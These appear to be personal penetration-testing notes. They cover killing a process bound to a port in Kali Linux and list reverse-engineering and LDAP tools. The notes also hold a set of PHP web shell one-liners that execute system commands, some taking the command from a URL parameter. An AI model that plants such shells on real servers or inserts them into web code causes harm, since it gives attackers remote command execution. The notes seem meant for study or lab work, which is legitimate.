
# Kill a process
How to kill a process running on particular port in Kali Linux ?_?
or
How to kill a process if it show's port already in use ?_?

Stack overflow:
fuser 8080/tcp will print you PID of process bound on that port.
And this fuser -k 8080/tcp will kill that process.

https://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux


Web Shells
```
we could other php commands as well
trying all these <@456226577798135808> 
'# Execute one command
<?php system("whoami"); ?>

# Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

# preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks
<?php echo `whoami`; ?>'
```


# Reverse Engineering

dnSpy
ILSpy
Wine


## Alternate LDAPsearch

Apache Directory Studio

